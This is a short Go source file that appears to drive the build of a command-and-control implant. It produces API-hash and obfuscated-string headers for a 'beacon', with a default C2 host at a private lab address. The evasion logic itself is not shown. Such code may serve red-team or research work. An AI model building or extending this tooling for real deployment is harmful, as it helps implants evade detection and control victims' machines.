package main

import (
	"fmt"
	"os"

	"c2/hashgen"
	"c2/obfgen"
)

func main() {
	host := "192.168.64.50"
	if len(os.Args) > 1 {
		host = os.Args[1]
	}
	outDir := "../beacon/include"
	if len(os.Args) > 2 {
		outDir = os.Args[2]
	}
	if err := hashgen.Generate(outDir); err != nil {
		fmt.Fprintf(os.Stderr, "hashgen: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("api_hashes.h generated")
	if err := obfgen.Generate(host, outDir); err != nil {
		fmt.Fprintf(os.Stderr, "obfgen: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("obf_strings.h generated")
}
